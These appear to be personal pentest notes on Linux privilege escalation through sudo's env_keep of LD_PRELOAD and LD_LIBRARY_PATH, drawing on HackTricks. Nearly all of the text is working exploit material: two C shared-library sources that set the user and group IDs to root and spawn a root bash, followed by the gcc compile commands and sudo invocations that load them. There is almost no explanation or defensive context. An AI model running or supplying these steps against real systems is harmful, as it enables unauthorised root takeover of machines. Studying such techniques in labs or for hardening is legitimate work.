#### LD_PRELOAD
**env_keep+=LD_PRELOAD**
[Hack-Tricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

If sudo -l shows any root function and the env_keep+=LD+PRELOAD we can compile a shared library to bee called for priv-esc

`/tmp/pe.c`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

*compile & run*
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles

sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

**LD_LIBRARY_PATH**
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
